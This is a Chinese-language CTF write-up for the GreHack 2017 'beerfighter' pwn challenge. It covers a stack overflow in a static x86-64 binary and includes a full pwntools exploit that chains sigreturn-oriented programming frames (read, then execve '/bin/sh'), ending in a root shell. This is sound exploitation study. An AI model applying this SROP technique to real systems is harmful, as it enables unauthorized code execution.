---
layout: post
title: pwn grehackctf2017 beerfighter
excerpt: "grehackctf2017 beerfighter writeup"
categories: [Writeup]
comments: true
---

这个就是使用`syscall;ret`的一个srop

首先`file game `查看文件,竟然是一个静态文件
```bash
game: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, BuildID[sha1]=1f9b11cb913afcbbbf9cb615709b3c62b2fdb5a2, stripped
```
通过`ROPgadget --binary game |grep sys`查找到syscall gadget
```
0x0000000000400770 : syscall ; ret
```
如下可以得出offset为`0x410+8 = 1048`
```
__int64 sub_40017C()
{
  char v1; // [sp+10h] [bp-410h]@1

  qmemcpy(&v1, "Newcomer", 0x404uLL);
  begin_str();                                  // 无漏洞
  while ( (unsigned int)village_choice((__int64)&v1) )// 这里v1只有0x410,但之后可以放入更多,发生溢出
    ;
  output_morty((__int64)&unk_4007C0);
  return 0LL;
}
```
因为静态文件,没有symbol,所以不方便使用rop来调取libc中的system,stack中没有运行权限,不能写入shellcode








最后的exp
```
#!/usr/bin/env python

from pwn import *

elf = ELF('./game')
io = process('./game')
io.recvuntil("> ")
io.sendline("1")	#先输入1 ,到The City Hall
io.recvuntil("> ")
io.sendline("0")	#再输入0,输入name
io.recvuntil("> ")

context.clear()
context.arch = "amd64"

data_addr = elf.get_section_by_name('.data').header.sh_addr + 0x10
base_addr = data_addr + 0x8   # new stack address

# useful gadget
pop_rax_addr = 0x00000000004007b2   # pop rax ; ret
syscall_addr = 0x000000000040077f   # syscall ;

# sigreturn syscall				设置rax的值,并调用syscall
sigreturn  = p64(pop_rax_addr)
sigreturn += p64(constants.SYS_rt_sigreturn)    # 0xf
sigreturn += p64(syscall_addr)

# frame_2: execve to get shell
frame_2 = SigreturnFrame()
frame_2.rax = constants.SYS_execve
frame_2.rdi = data_addr
frame_2.rsi = 0
frame_2.rdx = 0
frame_2.rip = syscall_addr

# frame_1: read frame_2 to .data
frame_1 = SigreturnFrame()
frame_1.rax = constants.SYS_read
frame_1.rdi = constants.STDIN_FILENO
frame_1.rsi = data_addr
frame_1.rdx = len(str(frame_2))
frame_1.rsp = base_addr             # stack pivot
frame_1.rip = syscall_addr

payload_1  = "A" * 1048
payload_1 += sigreturn
payload_1 += str(frame_1)

io.sendline(payload_1)			#先覆盖掉return address
io.recvuntil("> ")
io.sendline("3")

payload_2  = "/bin/sh\x00"
payload_2 += sigreturn
payload_2 += str(frame_2)		#读取bin/sh 运行systemcall

io.sendline(payload_2)
io.interactive()
```
最后的运行结果
```
python exp.py 
[*] '/root/sploitfun/beerfighter/game'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Starting local process './game': pid 21935
[*] Switching to interactive mode
By !

$ id
uid=0(root) gid=0(root) groups=0(root)
```